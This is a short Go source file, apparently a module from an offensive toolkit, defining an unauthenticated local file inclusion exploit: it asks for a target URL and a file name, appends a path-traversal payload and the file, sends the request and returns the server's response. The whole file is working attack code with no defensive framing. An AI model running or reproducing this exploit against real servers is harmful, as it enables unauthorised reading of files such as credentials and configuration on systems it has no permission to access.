package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

//UnauthenticatedLFI ...
func UnauthenticatedLFI(payload string) string {
	var url, file string

	fmt.Printf("Url: ")
	fmt.Scanf("%s", &url)

	client := &http.Client{}

	fmt.Printf("Arquivo: ")
	fmt.Scanf("%s", &file)
	finalURL := url + payload + file
	req, _ := http.NewRequest("GET", finalURL, nil)
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	result := string(body)
	return result
}
